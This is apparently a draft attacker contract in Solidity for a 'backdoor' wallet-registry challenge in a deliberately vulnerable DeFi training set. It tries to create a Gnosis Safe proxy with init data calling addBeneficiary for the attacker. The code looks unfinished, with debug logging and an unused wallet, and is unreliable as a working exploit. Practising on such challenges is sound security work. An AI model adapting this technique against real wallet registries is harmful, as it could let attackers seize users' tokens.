// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../backdoor/WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../DamnValuableToken.sol";

import "hardhat/console.sol";

contract AttackBackdoor {
    DamnValuableToken token;
    WalletRegistry registry;
    GnosisSafe masterCopy;
    GnosisSafeProxyFactory proxyCreation;
    GnosisSafe contractWallet;

    constructor(
        address _token,
        address _registry,
        address _proxyCreation,
        address _wallet
    ) {
        token = DamnValuableToken(_token);
        registry = WalletRegistry(_registry);
        masterCopy = GnosisSafe(payable(_wallet));
        proxyCreation = GnosisSafeProxyFactory(_proxyCreation);
        contractWallet = new GnosisSafe();
    }

    function attack() public {
        console.log(
            abi
                .encodeWithSignature("addBeneficiary(address)", address(this))
                .length
        );
        proxyCreation.createProxy(
            address(masterCopy),
            abi.encodeWithSignature("addBeneficiary(address)", address(this))
        );
        console.log("Checking");
    }
}
